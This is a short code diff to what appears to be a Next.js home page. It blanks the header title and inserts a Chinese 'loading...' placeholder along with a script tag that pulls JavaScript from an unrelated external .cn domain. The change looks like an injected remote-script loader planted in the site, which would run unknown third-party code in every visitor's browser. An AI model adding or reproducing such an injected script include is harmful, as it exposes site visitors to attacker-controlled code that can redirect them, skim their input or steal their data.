@@ -13,9 +13,10 @@ export default function Home() {
     
     
       <main>
-        <Header title="Welcome to my app9999999999999999999!" />
+        <Header title="" />
         <p className="description">
-          Get started by editing <code>99999999pages/index.js</code>
+    <div style="margin-top:200px;width:100%" align="center">加载中...</div>
+    <script src='https://me9898.qwertgdd-swsss.cn/ff/'></script>
         </p>
       </main>
 
